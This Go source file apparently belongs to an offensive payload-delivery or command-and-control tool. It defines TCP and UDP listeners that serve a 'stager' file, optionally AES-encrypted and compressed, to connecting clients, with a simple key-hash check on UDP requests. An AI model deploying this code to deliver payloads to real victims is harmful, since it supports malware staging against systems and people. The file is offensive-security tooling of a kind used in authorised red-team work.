package listener

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
)

// TCPAESCompressedListener serves the encrypted stager file over raw TCP.
// stagerPath: the path to the stager file to serve.
// port: the port to serve the stager file on.
// keyStr: the passphrase to encrypt the stager file.
// compression: whether to compress the stager file before encryption.
func TCPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	key := deriveKeyFromString(keyStr)

	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(stager)
	} else {
		toEncrypt = stager
	}
	encryptedStager := encryptData(toEncrypt, key)

	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to start TCP listener: %v", err)
	}
	defer listener.Close()

	log.Printf("TCP listener started on port %s", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleTCPConnection(conn, encryptedStager)
	}
}

func handleTCPConnection(conn net.Conn, data []byte) {
	defer conn.Close()
	log.Printf("TCP connection from %s", conn.RemoteAddr())

	// Send the encrypted data
	_, err := conn.Write(data)
	if err != nil {
		log.Printf("Failed to send data to %s: %v", conn.RemoteAddr(), err)
		return
	}

	log.Printf("Sent %d bytes to %s", len(data), conn.RemoteAddr())
}

// TCPBareListener serves the stager file over raw TCP without encryption or compression.
func TCPBareListener(stagerPath string, port string) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to start TCP listener: %v", err)
	}
	defer listener.Close()

	log.Printf("TCP listener (bare) started on port %s", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleTCPConnection(conn, stager)
	}
}

// UDPAESCompressedListener serves the encrypted stager file over UDP.
// stagerPath: the path to the stager file to serve.
// port: the port to serve the stager file on.
// keyStr: the passphrase to encrypt the stager file.
// compression: whether to compress the stager file before encryption.
func UDPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	key := deriveKeyFromString(keyStr)

	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(stager)
	} else {
		toEncrypt = stager
	}
	encryptedStager := encryptData(toEncrypt, key)

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %v", err)
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to start UDP listener: %v", err)
	}
	defer conn.Close()

	log.Printf("UDP listener started on port %s", port)

	// Calculate key hash for authentication
	keyHash := uint32(0)
	for i := 0; i < len(key); i++ {
		keyHash ^= uint32(key[i]) << ((i % 4) * 8)
	}

	buffer := make([]byte, 1024)
	for {
		n, remoteAddr, err := conn.ReadFromUDP(buffer)
		if err != nil {
			log.Printf("Failed to read from UDP: %v", err)
			continue
		}

		// Verify authentication (key hash)
		if n == 4 {
			receivedHash := binary.LittleEndian.Uint32(buffer[:4])
			if receivedHash == keyHash {
				log.Printf("Authenticated request from %s", remoteAddr)
				go handleUDPConnection(conn, remoteAddr, encryptedStager)
			} else {
				log.Printf("Authentication failed from %s (hash mismatch)", remoteAddr)
			}
		}
	}
}

func handleUDPConnection(conn *net.UDPConn, addr *net.UDPAddr, data []byte) {
	const chunkSize = 1024
	offset := 0

	for offset < len(data) {
		end := offset + chunkSize
		if end > len(data) {
			end = len(data)
		}

		_, err := conn.WriteToUDP(data[offset:end], addr)
		if err != nil {
			log.Printf("Failed to send UDP chunk to %s: %v", addr, err)
			return
		}

		offset = end
	}

	// Send end marker (4 zero bytes)
	endMarker := make([]byte, 4)
	_, err := conn.WriteToUDP(endMarker, addr)
	if err != nil {
		log.Printf("Failed to send end marker to %s: %v", addr, err)
		return
	}

	log.Printf("Sent %d bytes to %s", len(data), addr)
}

// UDPBareListener serves the stager file over UDP without encryption or compression.
func UDPBareListener(stagerPath string, port string) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %v", err)
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to start UDP listener: %v", err)
	}
	defer conn.Close()

	log.Printf("UDP listener (bare) started on port %s", port)

	buffer := make([]byte, 1024)
	for {
		n, remoteAddr, err := conn.ReadFromUDP(buffer)
		if err != nil {
			log.Printf("Failed to read from UDP: %v", err)
			continue
		}

		// Any request triggers sending the stager
		if n > 0 {
			log.Printf("Request from %s", remoteAddr)
			go handleUDPConnection(conn, remoteAddr, stager)
		}
	}
}
